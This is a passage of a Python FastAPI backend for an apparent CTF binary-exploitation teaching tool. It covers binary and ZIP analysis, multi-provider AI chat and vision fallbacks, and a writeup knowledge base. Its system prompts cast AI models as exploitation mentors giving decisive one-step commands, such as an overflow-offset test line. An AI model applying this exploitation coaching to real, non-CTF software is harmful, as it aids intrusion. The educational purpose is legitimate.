                header = file_content[:64].lower()
                is_suspicious = any(header.startswith(sig) for sig in SUSPICIOUS_HEADERS)
                if is_suspicious:
                    skipped.append({"filename": entry, "reason": "File appears to be a script or markup, not a binary."})
                    continue

            # Analyze this binary
            try:
                result = _analyze_single_file(file_content, entry, inner_ext, detected_type, skip_virustotal=skip_virustotal)
                results.append(result)
            except Exception as exc:
                logger.warning("Failed to analyze '%s' from ZIP: %s", entry, exc)
                skipped.append({"filename": entry, "reason": f"Analysis failed: {exc}"})

        if not results and not source_code_results:
            raise HTTPException(
                status_code=400,
                detail="No analyzable files found in the ZIP archive (no binaries or source code).",
            )

        return {
            "archive": original_filename,
            "total_entries": len(entries),
            "analyzed_count": len(results),
            "source_code_count": len(source_code_results),
            "skipped_count": len(skipped),
            "results": results,
            "source_code_results": source_code_results,
            "skipped": skipped,
        }
    finally:
        # ALWAYS delete the extracted directory — no exceptions.
        if tmp_dir and os.path.exists(tmp_dir):
            shutil.rmtree(tmp_dir, ignore_errors=True)


# ---------------------------------------------------------------------------
# Endpoints
# ---------------------------------------------------------------------------
@app.get("/health")
async def health():
    """Lightweight health-check — returns ``{"status": "ok"}``."""
    return {"status": "ok"}


@app.post("/analyze")
async def analyze(
    request: Request,
    file: UploadFile = File(...),
    password: str | None = Form(default=None),
    skip_virustotal: str = Form(default="false"),
):
    """
    Accept a binary file upload, validate it strictly, extract readable
    strings via static analysis, and return the results as JSON.

    Supports:
    • Named binary files (.bin, .elf, .exe, .so, .dll, .out, .o)
    • Extensionless files (auto-detected via magic bytes — ELF, PE, Mach-O)
    • ZIP archives (extracts and analyzes each binary inside)
    • Password-protected ZIP archives (password provided via form field)

    The uploaded file is saved to a temporary location and **always**
    deleted after processing — even when an error occurs.

    Security:
    • Password is NEVER stored or logged — used only for ZIP extraction.
    • Wrong password attempts are counted in the rate limit.
    """
    skip_vt = skip_virustotal.lower() in ("true", "1", "yes")

    # ── 1. Validate extension (before reading the full body) ──────────
    ext = _validate_extension(file.filename)

    # ── 1b. Sanitize filename — strip directory components (path traversal) ──
    safe_filename = Path(file.filename or "unknown").name or "unknown"

    # ── 2. Read content into memory & validate size ───────────────────
    content = await file.read()
    _validate_size(content, is_zip=(ext == ".zip"))

    # ── 3. Handle ZIP archives ────────────────────────────────────────
    if ext == ".zip":
        _validate_mime(content, ext)
        # Pass password (never logged) — clear from locals immediately after
        zip_password = password
        password = None  # clear from function scope
        try:
            return _analyze_zip(content, safe_filename, password=zip_password, skip_virustotal=skip_vt)
        finally:
            zip_password = None  # clear from memory

    # ── 4. Auto-detect extensionless files via magic bytes ────────────
    detected_type = ""
    if ext == "":
        detected_type = _detect_type_from_magic(content)
    else:
        # ── 5. Validate content signature / MIME ──────────────────────
        _validate_mime(content, ext)

    # ── 6. Analyze the single binary ─────────────────────────────────
    # Run parallel AI inference BEFORE calling _analyze_single_file
    # so we can pass pre-computed hints into it.
    # We need strings/patterns first — do a quick pre-extract.
    import tempfile as _tmp_mod
    _fd, _pre_tmp = _tmp_mod.mkstemp(
        suffix=(ext if ext else ".bin"), dir=_tmp_mod.gettempdir()
    )
    os.write(_fd, content)
    os.close(_fd)
    try:
        _pre_strings = _run_strings(_pre_tmp)
        _pre_patterns = detect_patterns(_pre_strings)
        _pre_checksec = run_checksec(_pre_tmp)

        # CTF category for category-aware prompts
        _pre_format_string = detect_format_string(_pre_strings, _pre_patterns)
        _pre_rop_gadgets = find_rop_gadgets(content)
        _pre_ctf_category = detect_ctf_category(
            _pre_patterns, _pre_checksec, _pre_strings,
            format_string_result=_pre_format_string,
            rop_gadgets=_pre_rop_gadgets,
        )

        # Knowledge base writeup context
        _pre_writeup_context = ""
        if ctf_knowledge:
            try:
                _analysis_so_far = {
                    "ctf_category": _pre_ctf_category,
                    "patterns": _pre_patterns,
                    "checksec": _pre_checksec,
                    "filename": safe_filename,
                }
                _similar = ctf_knowledge.find_similar_writeups(_analysis_so_far)
                _pre_writeup_context = ctf_knowledge.format_for_ai_context(_similar)
            except Exception:
                pass

        # Launch parallel AI hints
        hints_result = await get_ai_hints_parallel(
            _pre_strings, _pre_patterns, _pre_writeup_context,
            ctf_category=_pre_ctf_category, checksec=_pre_checksec,
        )
    finally:
        if os.path.exists(_pre_tmp):
            os.unlink(_pre_tmp)

    analysis_result = _analyze_single_file(
        content, safe_filename, ext, detected_type,
        skip_virustotal=skip_vt, hints_override=hints_result,
    )

    # ── 7. Kick off background writeup search (non-blocking) ──────────
    # The response is returned immediately; this thread runs after.
    if not _is_testing():
        try:
            from knowledge_base.live_search import WriteupLiveSearch  # noqa: PLC0415

            _ctf_cat = analysis_result.get("ctf_category") or {}
            _cat_str = _ctf_cat.get("category", "unknown") if isinstance(_ctf_cat, dict) else "unknown"
            _pats = analysis_result.get("patterns") or {}
            _dangerous = _pats.get("dangerous_functions", []) if isinstance(_pats, dict) else []

            _live_searcher = WriteupLiveSearch()

            def _background_search() -> None:
                try:
                    _live_searcher.search_and_save(
                        binary_name=safe_filename,
                        ctf_category=_cat_str,
                        dangerous_functions=_dangerous,
                        filename_prefix=f"live_{_live_searcher._sanitize_filename(safe_filename)}",
                    )
                except Exception as _exc:
                    print(f"[LiveSearch] Background search error: {_exc}")

            _t = threading.Thread(target=_background_search, daemon=True)
            _t.start()
        except Exception as _import_exc:
            print(f"[LiveSearch] Could not start background search: {_import_exc}")

    # ── 8. Analytics logging ──────────────────────────────────────────
    if not _is_testing():
        try:
            _ar = analysis_result
            _cat = _ar.get("ctf_category") or {}
            _cat_str = _cat.get("category", "unknown") if isinstance(_cat, dict) else "unknown"
            _diff = _ar.get("difficulty") or {}
            _diff_str = _diff.get("difficulty", "unknown") if isinstance(_diff, dict) else "unknown"
            _rag_hits = len(_ar.get("similar_writeups") or [])
            # Infer which provider was used from hints_result keys
            if hints_result and hints_result.get("enhanced"):
                _prov = "groq+nemotron"
            elif hints_result and hints_result.get("quick"):
                _prov = "groq"
            else:
                _prov = "fallback"
            log_analytics(safe_filename, _cat_str, _diff_str, _rag_hits, _prov)
        except Exception as _log_exc:
            print(f"[BinExplain] Analytics log error: {_log_exc}")

    return analysis_result


@app.post("/analyze-code")
async def analyze_code_endpoint(request: Request, body: CodeAnalysisRequest):
    """
    Analyze source code for vulnerabilities and dangerous patterns.

    Accepts source code as text (max 10,000 characters), sends to AI
    (Claude → Groq → OpenAI → Ollama fallback), and returns structured
    analysis results.

    Security:
    • Code is NEVER stored to disk or executed.
    • Code is only sent to AI APIs in memory.
    • No temp files are created.
    • Rate limited to 10 requests per hour per IP.
    """
    return analyze_source_code(body.code, body.filename)


@app.get("/virustotal/{scan_id}")
async def get_virustotal_result(request: Request, scan_id: str):
    """
    Poll for VirusTotal scan results by scan_id.

    Returns the current status of the background VT scan:
    • {"status": "scanning"} — still in progress
    • {"status": "clean/suspicious/malicious", ...} — completed
    • {"status": "pending", ...} — VT timed out, check permalink
    • 404 — unknown scan_id
    """
    if scan_id not in _vt_scans:
        raise HTTPException(status_code=404, detail="Unknown scan ID.")

    entry = _vt_scans[scan_id].copy()
    # Strip internal fields
    entry.pop("_created", None)
    return entry


# ---------------------------------------------------------------------------
# POST /feedback — anonymous hint quality feedback
# ---------------------------------------------------------------------------
class FeedbackRequest(BaseModel):
    vote: Literal["up", "down"]
    filename: str = ""

    @field_validator("filename")
    @classmethod
    def cap_filename(cls, v: str) -> str:
        return v[:200]


@app.post("/feedback")
async def submit_feedback(request: Request, body: FeedbackRequest):
    """
    Accept anonymous thumbs-up/down feedback on AI hints.

    Votes are logged to logs/feedback.log for quality tracking.
    Rate limited to 30/hour per IP to prevent abuse.
    """
    logger.info(
        "[Feedback] vote=%s filename=%s ip=%s",
        body.vote,
        body.filename or "(none)",
        get_remote_address(request),
    )
    try:
        log_feedback(
            filename=body.filename or "(none)",
            category="unknown",
            provider="unknown",
            is_positive=(body.vote == "up"),
        )
    except Exception as _fb_exc:
        print(f"[BinExplain] Feedback log error: {_fb_exc}")
    return {"status": "ok", "message": "Thanks for your feedback!"}


def build_chat_system_prompt(binary_context: dict, tried_commands: list = None) -> str:
    if not binary_context:
        return "You are a CTF binary exploitation mentor. Give specific, actionable hints."

    tried_section = ""
    if tried_commands:
        tried_section = "COMMANDS ALREADY TRIED (DO NOT SUGGEST THESE AGAIN):\n"
        tried_section += "\n".join(f"  - {cmd}" for cmd in tried_commands)

    prot = binary_context.get("protections", {})
    prot_lines = "\n".join(
        f"  {k.upper()}: {'ENABLED' if str(v).lower() not in ['disabled','no','none','false','0','unknown'] else 'DISABLED'}"
        for k, v in prot.items()
    )

    gadgets = binary_context.get("rop_gadgets", [])
    gadget_lines = "\n".join(
        f"  {g.get('address','?')}: {g.get('gadget','?')}"
        if isinstance(g, dict) else f"  {g}"
        for g in gadgets[:5]
    ) if gadgets else "  None found"

    functions = binary_context.get("functions", [])
    func_lines = "\n".join(f"  - {f}" for f in functions[:10]) if functions else "  None found"

    imports = binary_context.get("imports", [])
    import_lines = "\n".join(f"  - {i}" for i in imports[:10]) if imports else "  None found"

    template = binary_context.get("pwntools_template", "")
    template_section = f"\nPWNTOOLS TEMPLATE (ALREADY GENERATED — TELL USER TO USE THIS):\n```python\n{template[:600]}\n```" if template else ""

    flag_formats = binary_context.get("flag_formats", ["flag{"])
    similar = binary_context.get("similar_writeups", [])
    similar_section = ""
    if similar:
        similar_section = "\nSIMILAR CTF CHALLENGES FROM KNOWLEDGE BASE:\n"
        similar_section += "\n".join(f"  - {w}" for w in similar[:3])

    filename = binary_context.get("filename", "binary")
    filename_clean = filename.rsplit(".", 1)[0].replace("-", "_").replace(" ", "_")

    return f"""You are an elite CTF binary exploitation mentor embedded in BinExplain.
You are NOT a generic AI assistant. You are a CTF specialist.
Your hints must reference the SPECIFIC DATA below. Generic advice is FAILURE.

==============================================================
BINEXPLAIN ANALYSIS RESULTS — REFERENCE EVERYTHING FROM HERE:
==============================================================
Filename:          {filename}
Architecture:      {binary_context.get('architecture','?')} ({binary_context.get('bits','?')}-bit)
CTF Category:      {binary_context.get('ctf_category','unknown')} (confidence: {binary_context.get('confidence','?')})
Difficulty:        {binary_context.get('difficulty','unknown')}
Predicted Offset:  {binary_context.get('predicted_offset','not detected')} bytes
Format String:     {'YES — printf(buf) detected' if binary_context.get('format_string_found') else 'Not detected'}
Libc Version:      {binary_context.get('libc_version','not identified')}
CVSS Score:        {binary_context.get('cvss_score','N/A')}

SECURITY PROTECTIONS:
{prot_lines}

ROP GADGETS FOUND BY BINEXPLAIN:
{gadget_lines}

KEY FUNCTIONS:
{func_lines}

KEY IMPORTS:
{import_lines}

DATA FLOW: {binary_context.get('data_flow','not available')}
{template_section}
{similar_section}
{tried_section}
==============================================================

MANDATORY RULES — FOLLOW ALL OF THESE IN EVERY SINGLE RESPONSE:

RULE 1: Every hint MUST reference specific data from above. Quote actual values.
  WRONG: "Check the buffer overflow offset"
  RIGHT: "Your predicted offset is {binary_context.get('predicted_offset','X')} bytes. Verify with:
  python3 -c 'print(\"A\" * {binary_context.get('predicted_offset','X')} + \"BBBB\")' | ./{filename}"

RULE 2: ONE STEP PER RESPONSE. Exactly one next action. Not two. Not five.

RULE 3: INSTALL FIRST. If a tool is needed, always give install command first
  in its own bash block labeled "# Install first:".
  NEVER say "if you don't have X, try Y instead". Always install X.

RULE 4: NO REPETITION. Never suggest any command in the TRIED list above.

RULE 5: Every command in its own ```bash block. Never inline in sentences.

RULE 6: Maximum 4 sentences outside code blocks. Be a sniper, not a shotgun.

RULE 7: ALWAYS reference the pwntools template. Tell user to modify it.
  Say: "Your template exploit_{filename_clean}.py is already generated. Modify line X."

RULE 8: Flag formats for this binary: {', '.join(flag_formats)}. Help find them.

RULE 9: Never say: "you could", "it depends", "maybe try", "one approach",
  "let me know", "hope this helps", "feel free to ask", "as an AI".

RULE 10: Be decisive. Give the command. Do not hedge.
==============================================================
""" + """
TOOL INSTALL RULE:
If you suggest any command using a tool, ALWAYS provide the install command
FIRST in its own ```bash block labeled with a comment "# Install first if needed:".
NEVER say "if you don't have X, try Y instead".
ALWAYS say "Install X first:" then give the install command, then usage.

Common CTF tool install commands:
  gdb:        sudo apt-get install -y gdb
  pwndbg:     git clone https://github.com/pwndbg/pwndbg && cd pwndbg && ./setup.sh
  pwntools:   pip3 install pwntools
  ROPgadget:  pip3 install ROPgadget
  ropper:     pip3 install ropper
  checksec:   pip3 install checksec.py
  ltrace:     sudo apt-get install -y ltrace
  one_gadget: gem install one_gadget
  angr:       pip3 install angr
"""


@app.post("/chat")
async def chat(request: Request, body: ChatRequest):
    """
    Conversational follow-up endpoint.

    Accepts the full conversation history from the client (nothing is stored
    server-side) plus the initial analysis context, forwards to Anthropic
    Claude (with Ollama fallback), and returns a single AI response.

    Security:
    • Max 10 messages in history, max 2000 chars per message.
    • No database, no file writes, no storage of any kind.
    • User text goes directly to the AI only.
    """
    # ── Validate message count ────────────────────────────────────────
    if len(body.messages) > MAX_CHAT_MESSAGES:
        raise HTTPException(
            status_code=400,
            detail=f"Too many messages. Maximum {MAX_CHAT_MESSAGES} allowed.",
        )

    if not body.messages:
        raise HTTPException(status_code=400, detail="No messages provided.")

    if _is_testing():
        return {"response": "Mocked AI response for chat.\n• Observation 1.\n• Observation 2.\n**Next:** Try checksec."}

    # ── Build message list for the AI ─────────────────────────────────
    ai_messages: list[dict] = []

    # Inject analysis context as structured binary details so the
    # AI always knows what binary was analysed and can give specific answers.
    if body.context:
        context_header = (
            "IMPORTANT BINARY CONTEXT (reference this in EVERY response):\n"
            "---\n"
            + body.context[:MAX_CHAT_CHARS * 2]
            + "\n---\n"
            "Use the binary name, CTF category, checksec results, and findings above "
            "to give SPECIFIC answers. Never use generic placeholders."
        )
        ai_messages.append({
            "role": "user",
            "content": context_header,
        })
        ai_messages.append({
            "role": "assistant",
            "content": "Got it -- I have reviewed the full analysis of your binary. "
                        "I will reference these specific details in every answer. "
                        "Ask me anything about exploiting this binary!",
        })

    # Append the actual conversation history
    for msg in body.messages:
        ai_messages.append({"role": msg.role, "content": msg.content})

    # ── Build system prompt dynamically ────────────────
    binary_context = body.binary_context or {}
    tried_commands = body.tried_commands or []
    system_prompt = build_chat_system_prompt(binary_context, tried_commands)

    # ── Provider 1: Groq (free, fast) ───────────────────────────────────
    groq_result = _try_groq(messages=ai_messages, system_prompt=system_prompt)
    if groq_result:
        logger.info("[BinExplain] /chat: Groq succeeded")
        return {"response": groq_result}

    # ── Provider 2: Nemotron ──────────────────────────────────────────
    nemotron_result = _try_nemotron(prompt=ai_messages, system=system_prompt)
    if nemotron_result:
        logger.info("[BinExplain] /chat: Nemotron succeeded")
        return {"response": nemotron_result}

    # ── Provider 3: Gemini ────────────────────────────────────────────
    gemini_result = _try_gemini(messages=ai_messages, system_prompt=system_prompt)
    if gemini_result:
        logger.info("[BinExplain] /chat: Gemini succeeded")
        return {"response": gemini_result}

    # ── Provider 4: OpenAI GPT-4o-mini ────────────────────────────────
    openai_result = _try_openai(messages=ai_messages, system_prompt=system_prompt)
    if openai_result:
        logger.info("[BinExplain] /chat: OpenAI succeeded")
        return {"response": openai_result}

    # ── Provider 5: Ollama multi-turn chat ────────────────────────────
    ollama_messages = [{"role": "system", "content": system_prompt}] + ai_messages
    ollama_result = _try_ollama_chat(ollama_messages)
    if ollama_result:
        logger.info("[BinExplain] /chat: Ollama succeeded")
        return {"response": ollama_result}

    # ── Provider 6: Claude (last resort) ──────────────────────────────
    claude_result = _try_claude(messages=ai_messages, system_prompt=system_prompt)
    if claude_result:
        logger.info("[BinExplain] /chat: Claude succeeded")
        return {"response": claude_result}

    raise HTTPException(
        status_code=503,
        detail="AI is taking a short break \u2014 please try again in 30 seconds.",
    )


# ---------------------------------------------------------------------------
# Command Explainer endpoint
# ---------------------------------------------------------------------------
@app.post("/explain-command")
async def explain_command_endpoint(request: dict):
    command = request.get("command", "")
    if not command or not command.strip() or len(command) > 500:
        raise HTTPException(status_code=422, detail="Command validation failed")

    if _is_testing():
        return {"explanation": "Mocked command explanation for testing."}

    binary_context = request.get("binary_context", {}) or {}
    filename = binary_context.get("filename", "binary")
    category = binary_context.get("ctf_category", "binary exploitation")

    system = """You are a CTF command explainer for beginners.
Explain the command given in 3-5 sentences.
Structure your explanation as:
1. What the command does in plain English
2. What each important flag or argument means
3. What output to expect
4. What to look for in the output that matters for CTF
Be specific. Reference the actual binary filename and CTF category if provided.
Never be vague. Maximum 100 words total."""

    user_msg = f"""Explain this command in CTF context:
Command: {command}
Binary: {filename}
CTF Category: {category}
Architecture: {binary_context.get('architecture', 'unknown')}

Give a focused 3-5 sentence explanation following the structure above."""

    # Call the fastest available AI — Groq preferred for speed
    result = _try_groq(user_msg, system)
    if not result:
        result = _try_gemini(user_msg, system)
    if not result:
        result = "Could not generate explanation. Try again."

    return {"explanation": result}


# ---------------------------------------------------------------------------
# Image analysis endpoint  (Claude Vision)
# ---------------------------------------------------------------------------
MAX_IMAGE_SIZE = 5 * 1024 * 1024  # 5 MB
ALLOWED_IMAGE_EXTENSIONS: set[str] = {".png", ".jpg", ".jpeg", ".gif", ".webp"}
IMAGE_MAGIC_BYTES: dict[bytes, str] = {
    b"\x89PNG":      "image/png",
    b"\xff\xd8\xff": "image/jpeg",
    b"GIF87a":       "image/gif",
    b"GIF89a":       "image/gif",
    b"RIFF":         "image/webp",   # RIFF....WEBP
}

IMAGE_ANALYSIS_SYSTEM_PROMPT = """You are an expert CTF mentor looking at
a screenshot a student uploaded. This could be a terminal, GDB output,
Ghidra disassembly view, error message, or crash dump.

CRITICAL RULES:
- Describe SPECIFICALLY what you see in the image - exact text, addresses,
  error messages, register values if visible
- If you see a crash address, state the exact address and what it likely means
- If you see GDB output, identify what command was run and interpret the output
- If you see terminal commands, identify what was typed and what the output shows
- If you see Ghidra/IDA disassembly, identify the function and key instructions
- NEVER give generic advice like "run checksec" if you cannot actually read
  meaningful content from the image
- If the image is unclear or you cannot read specific details, say so
  explicitly: "I can see [general description] but cannot read [specific
  unclear part] - can you zoom in or describe it?"
- Give ONE specific next step based on what you actually observed
- Format: 2-4 sentences, conversational, not bullet points
"""


def is_low_quality_response(text: str) -> bool:
    if not text or len(text) < 50:
        return True
    generic_phrases = [
        "i can see an image",
        "this appears to be",
        "i don't have enough information",
        "without more context"
    ]
    text_lower = text.lower()
    generic_count = sum(1 for phrase in generic_phrases if phrase in text_lower)
    return generic_count >= 2 and len(text) < 150



def _validate_image_magic(content: bytes) -> str:
    """Validate image by magic bytes.  Returns MIME type or raises HTTPException."""
    for magic, mime in IMAGE_MAGIC_BYTES.items():
        if content[:len(magic)] == magic:
            # Extra check for WEBP — RIFF header must include WEBP marker
            if magic == b"RIFF" and b"WEBP" not in content[:12]:
                continue
            return mime
    raise HTTPException(
        status_code=400,
        detail="File does not appear to be a valid image (PNG, JPG, GIF, or WEBP).",
    )


@app.post("/analyze-image")
async def analyze_image(
    request: Request,
    file: UploadFile = File(...),
    context: str = "",
):
    """
    Analyze a screenshot using AI vision with full fallback chain.

    Fallback order:
    1. Claude Vision (claude-sonnet-4-20250514)
    2. OpenAI GPT-4o-mini Vision
    3. Groq Vision (llama-3.2-11b-vision-preview)
    4. Ollama llava (local, free)
    5. Final fallback error message

    Security invariants:
    • Image is NEVER stored to disk — only held in memory as bytes/base64.
    • Base64 string is discarded after the API call.
    • Magic bytes validated before processing.
    • Rate limited to 10 requests/hour.
    """
    import base64

    # ── Validate extension ────────────────────────────────────────────
    ext = ""
    if file.filename:
        dot = file.filename.rfind(".")
        if dot != -1:
            ext = file.filename[dot:].lower()
    if ext and ext not in ALLOWED_IMAGE_EXTENSIONS:
        raise HTTPException(
            status_code=400,
            detail=f"Invalid image type '{ext}'. Accepted: {', '.join(sorted(ALLOWED_IMAGE_EXTENSIONS))}",
        )

    # ── Read and validate size ────────────────────────────────────────
    content = await file.read()
    if len(content) > MAX_IMAGE_SIZE:
        raise HTTPException(
            status_code=400,
            detail=f"Image too large ({len(content) / 1024 / 1024:.1f} MB). Maximum: 5 MB.",
        )
    if len(content) == 0:
        raise HTTPException(status_code=400, detail="Image file is empty.")

    # ── Validate magic bytes ──────────────────────────────────────────
    mime_type = _validate_image_magic(content)

    # ── Convert to base64 ─────────────────────────────────────────────
    image_b64 = base64.b64encode(content).decode("utf-8")
    # Content bytes no longer needed
    del content

    # ── Build Prompts ─────────────────────────────────────────────────
    if context:
        prompt_text = (
            "Here is the analysis context of the binary I'm working on:\n\n"
            + context[:3000]
            + "\n\nNow here is my screenshot — please analyze it and tell me what to do next:"
        )
    else:
        prompt_text = "I'm working on a CTF binary challenge. Here is my screenshot — please analyze it and tell me what to do next:"

    if _is_testing():
        return {"response": "Mocked AI explanation of screenshot for testing."}

    ai_response = None

    # ── Provider 1: Gemini Vision (free, generous limits) ─────────────
    if not ai_response and GEMINI_API_KEY:
        try:
            import PIL.Image as _PILImage
            import io as _io
            img = _PILImage.open(_io.BytesIO(base64.b64decode(image_b64)))
            global gemini_client
            if not gemini_client:
                gemini_client = genai.Client(api_key=GEMINI_API_KEY)
            response = gemini_client.models.generate_content(
                model="gemini-2.5-flash",
                contents=[prompt_text, img],
                config=types.GenerateContentConfig(
                    system_instruction=IMAGE_ANALYSIS_SYSTEM_PROMPT,
                ),
            )
            val = response.text
            if val and val.strip():
                candidate = val.strip()
                if is_low_quality_response(candidate):
                    logger.warning("[BinExplain] Gemini Vision returned a low-quality response, falling back")
                else:
                    logger.info("[BinExplain] /analyze-image: Gemini Vision succeeded")
                    ai_response = candidate
        except Exception as exc:
            logger.error("Gemini Vision call failed: %s", exc)

    # ── Provider 2: Groq Vision (llama-3.2-11b-vision-preview) ────────
    if not ai_response and GROQ_API_KEY:
        try:
            client = groq.Groq(api_key=GROQ_API_KEY)
            response = client.chat.completions.create(
                model="llama-3.2-11b-vision-preview",
                max_tokens=1024,
                messages=[
                    {"role": "system", "content": IMAGE_ANALYSIS_SYSTEM_PROMPT},
                    {"role": "user", "content": [
                        {"type": "text", "text": prompt_text},
                        {"type": "image_url", "image_url": {"url": f"data:{mime_type};base64,{image_b64}"}}
                    ]}
                ]
            )
            val = response.choices[0].message.content
            if val and val.strip():
                candidate = val.strip()
                if is_low_quality_response(candidate):
                    logger.warning("[BinExplain] Groq Vision returned a low-quality response, falling back")
                else:
                    logger.info("[BinExplain] /analyze-image: Groq Vision succeeded")
                    ai_response = candidate
        except Exception as exc:
            logger.error("Groq Vision call failed: %s", exc)

    # ── Provider 3: GPT-4o-mini (Vision) ──────────────────────────────
    if not ai_response and OPENAI_API_KEY:
        try:
            client = openai.OpenAI(api_key=OPENAI_API_KEY)
            response = client.chat.completions.create(
                model="gpt-4o-mini",
                max_tokens=1024,
                messages=[
                    {"role": "system", "content": IMAGE_ANALYSIS_SYSTEM_PROMPT},
                    {"role": "user", "content": [
                        {"type": "text", "text": prompt_text},
                        {"type": "image_url", "image_url": {"url": f"data:{mime_type};base64,{image_b64}"}}
                    ]}
                ]
            )
            val = response.choices[0].message.content
            if val and val.strip():
                candidate = val.strip()
                if is_low_quality_response(candidate):
                    logger.warning("[BinExplain] OpenAI Vision returned a low-quality response, falling back")
                else:
                    logger.info("[BinExplain] /analyze-image: OpenAI Vision succeeded")
                    ai_response = candidate
        except Exception as exc:
            logger.error("GPT-4o Vision call failed: %s", exc)

    # ── Provider 4: Ollama llava (local, free) ────────────────────────
    if not ai_response:
        try:
            resp = requests.post(
                f"{OLLAMA_BASE_URL}/api/generate",
                json={"model": "llava", "prompt": IMAGE_ANALYSIS_SYSTEM_PROMPT + "\n\n" + prompt_text, "images": [image_b64], "stream": False},
                timeout=120,
            )
            if resp.status_code == 200:
                data = resp.json()
                val = data.get("response", "").strip()
                if val:
                    candidate = val.strip()
                    if is_low_quality_response(candidate):
                        logger.warning("[BinExplain] Ollama llava returned a low-quality response, falling back")
                    else:
                        logger.info("[BinExplain] /analyze-image: Ollama llava succeeded")
                        ai_response = candidate
        except Exception as exc:
            logger.error("Ollama llava call failed: %s", exc)

    # ── Provider 5: Claude Vision (last resort) ───────────────────────
    if not ai_response and ANTHROPIC_API_KEY:
        try:
            client = anthropic.Anthropic(api_key=ANTHROPIC_API_KEY)
            response = client.messages.create(
                model="claude-sonnet-4-20250514",
                max_tokens=1024,
                system=IMAGE_ANALYSIS_SYSTEM_PROMPT,
                messages=[{"role": "user", "content": [
                    {"type": "text", "text": prompt_text},
                    {"type": "image", "source": {"type": "base64", "media_type": mime_type, "data": image_b64}}
                ]}],
            )
            val = response.content[0].text
            if val and val.strip():
                candidate = val.strip()
                if is_low_quality_response(candidate):
                    logger.warning("[BinExplain] Claude Vision returned a low-quality response, falling back")
                else:
                    logger.info("[BinExplain] /analyze-image: Claude Vision succeeded")
                    ai_response = candidate
        except Exception as exc:
            logger.error("Claude Vision call failed: %s", exc)

    # Ensure base64 is cleared from memory
    image_b64 = ""
    del image_b64

    if not ai_response:
        ai_response = (
            "Image analysis unavailable -- all AI providers failed. "
            "Try describing what you see in the chat instead."
        )

    return {"response": ai_response}


# ---------------------------------------------------------------------------
# Knowledge Base Management Endpoints
# ---------------------------------------------------------------------------
@app.post("/refresh-knowledge-base")
async def refresh_knowledge_base():
    """
    Manually trigger a knowledge base refresh.
    Runs the scraper and reloads walkthroughs into ChromaDB.
    """
    global ctf_knowledge
    try:
        from knowledge_base.scraper import WriteupScraper
        from knowledge_base.rag_engine import CTFKnowledgeBase

        scraper = WriteupScraper()
        scraper.run()

        if ctf_knowledge is None:
            ctf_knowledge = CTFKnowledgeBase()
        ctf_knowledge.update_from_scraper()

        doc_count = ctf_knowledge.collection.count()
        return {
            "status": "success",
            "message": f"Knowledge base refreshed. {doc_count} documents loaded.",
            "document_count": doc_count,
        }
    except Exception as exc:
        logger.error("Knowledge base refresh failed: %s", exc)
        return JSONResponse(
            status_code=500,
            content={"status": "error", "detail": str(exc)},
        )


@app.get("/knowledge-base-stats")
async def knowledge_base_stats():
    """
    Return stats about the knowledge base: document count, categories,
    scheduler status, and walkthrough directory info.
    """
    stats = {
        "status": "unavailable",
        "document_count": 0,
        "categories": {},
        "scheduler_running": _kb_scheduler is not None and _kb_scheduler.running,
        "walkthrough_files": 0,
    }

    # Count walkthrough files on disk
    walkthroughs_dir = Path(__file__).resolve().parent / "knowledge_base" / "walkthroughs"
    if walkthroughs_dir.exists():
        stats["walkthrough_files"] = len(list(walkthroughs_dir.glob("*.txt")))

    if ctf_knowledge is not None:
        try:
            doc_count = ctf_knowledge.collection.count()
            stats["status"] = "ready"
            stats["document_count"] = doc_count

            # Gather category breakdown
            all_docs = ctf_knowledge.collection.get(include=["metadatas"])
            if all_docs and all_docs.get("metadatas"):
                categories: dict[str, int] = {}
                for meta in all_docs["metadatas"]:
                    cat = (meta or {}).get("category", "unknown")
                    categories[cat] = categories.get(cat, 0) + 1
                stats["categories"] = categories
        except Exception as exc:
            logger.warning("Failed to get KB stats: %s", exc)
            stats["status"] = "error"

    return stats


# ---------------------------------------------------------------------------
# Cache Augmented Generation (CAG) stats endpoint
# ---------------------------------------------------------------------------
@app.get("/cache-stats")
async def cache_stats():
    """
    Return aggregate CAG cache statistics: total cached entries,
    total cache hits, hit rate %, and most common categories.
    """
    return _hint_cache.get_stats()


# ---------------------------------------------------------------------------
# Contact form endpoint
# ---------------------------------------------------------------------------
@app.post("/contact")
@app.post("/api/contact")
async def contact_form(name: str = Body(...), email: str = Body(...), subject: str = Body(...), message: str = Body(...)):
    # Log to backend/logs/contact.log
    import datetime
    os.makedirs("logs", exist_ok=True)
    with open("logs/contact.log", "a", encoding="utf-8") as f:
        f.write(f"{datetime.datetime.now().isoformat()} | {name} | {email} | {subject} | {message[:200]}\n")
    return {"status": "received"}


# ---------------------------------------------------------------------------
# Entry point
# ---------------------------------------------------------------------------
if __name__ == "__main__":
    import uvicorn

    uvicorn.run(app, host="0.0.0.0", port=8000)
